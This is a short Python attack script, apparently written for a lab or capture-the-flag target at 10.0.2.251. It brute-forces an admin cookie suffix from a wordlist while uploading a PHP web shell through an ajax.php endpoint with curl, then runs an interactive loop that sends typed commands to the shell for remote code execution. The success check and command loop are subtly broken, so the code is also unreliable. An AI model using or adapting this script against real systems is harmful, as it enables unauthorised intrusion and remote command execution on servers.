import os
import requests

wordlist = "abcs.txt"

with open(wordlist, "r") as file:
    words = file.read().splitlines()

    for word in words:
        command = "curl -k -F 'file=@./shell.php' -F 'secure=val1d' --cookie 'admin=&G6u@B6uDXMq&Ms"+word + " " + "http://10.0.2.251/ajax.php"
        os.system(command)
        print(command)

    if "1" in command:
        print("[+] Shell Uploaded!")
        for execute in command:
            execute_command = input ("[!] Command to Execute: ")
            get_rce = requests.get("http://10.0.2.251/owls/shell.php?cmd="+execute_command)
            print(str(get_rce.content))

            if execute_command == "clear":
                os.system("clear")

    else:
        print("[!] Shell not Uploaded!")